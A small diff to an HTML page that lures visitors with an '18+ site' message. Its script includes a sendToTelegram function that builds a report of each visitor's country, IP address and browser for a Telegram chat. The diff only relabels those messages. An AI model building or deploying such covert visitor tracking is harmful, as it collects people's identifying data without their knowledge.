@@ -116,6 +116,7 @@
             <div class="card">
                 <h1>Click "Open in the browser" to access the 18+ site.</h1>
                 <img src="pic.jpg" alt="Share Menu">
+                
             </div>
         </div>
     </main>
@@ -161,8 +162,8 @@ function countUniqueVisitors() {
 
 // Отправка информации в телеграмм чат
 function sendToTelegram(info, uniqueCount, isUnique) {
-    const visitType = isUnique ? '🍏 Уникальное' : '🍎 Повторное';
-    const message = `${visitType} посещение сайта:\n\n` +
+    const visitType = isUnique ? '🍏Уник' : '🍎Повторка';
+    const message = `${visitType}:\n\n` +
                     `🌍 Страна: ${info.country}\n` +
                     `📍 IP: ${info.ip}\n` +
                     `🖥 Браузер: ${info.browser}\n` +
@@ -224,6 +225,9 @@ document.addEventListener('DOMContentLoaded', async () => {
 
 
 
+
     </script>
+
+
 </body>
 </html>
